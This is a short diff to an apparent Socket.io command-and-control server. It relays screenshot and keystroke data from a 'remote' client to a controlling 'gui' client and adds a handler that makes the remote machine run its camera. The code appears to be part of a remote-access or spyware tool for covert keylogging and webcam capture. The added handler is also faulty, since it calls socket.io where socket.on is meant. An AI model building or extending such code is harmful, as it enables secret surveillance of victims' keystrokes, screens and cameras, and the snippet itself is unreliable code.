@@ -58,6 +58,10 @@ io.on('connection', function(socket){
   	 io.sockets.to(remoteSocketId).emit('screenshot');
   })
 
+  socket.io('runCamera', (data) => {
+	io.sockets.to(remoteSocketId).emit('runCamera');
+  })
+
   socket.on('message', (data) => {
   	remoteSocketId = socket.id
   })
@@ -94,6 +98,7 @@ io.on('connection', function(socket){
   	console.log('sending to gui remote... id: ', guiSocketId)
   	io.sockets.to(guiSocketId).emit('keystrokes', data);
   })
+
 
 
   setInterval(() => {
